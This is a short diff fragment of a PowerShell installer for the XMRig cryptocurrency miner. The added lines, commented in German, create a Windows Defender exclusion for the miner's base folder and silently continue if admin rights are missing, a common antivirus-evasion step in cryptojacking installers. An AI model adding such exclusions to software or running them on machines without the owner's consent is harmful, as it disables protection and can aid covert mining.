@@ -18,6 +18,13 @@ $Xmrig      = Join-Path $InstallDir $ExeName
 
 New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
 
+# ---------- Windows Defender Ausnahme setzen ----------
+try {
+    Add-MpPreference -ExclusionPath $BaseDir -ErrorAction Stop
+} catch {
+    # Falls keine Admin-Rechte vorhanden sind, einfach weitermachen
+}
+
 # ---------- settings.json ohne BOM ----------
 $configJson = @"
 {
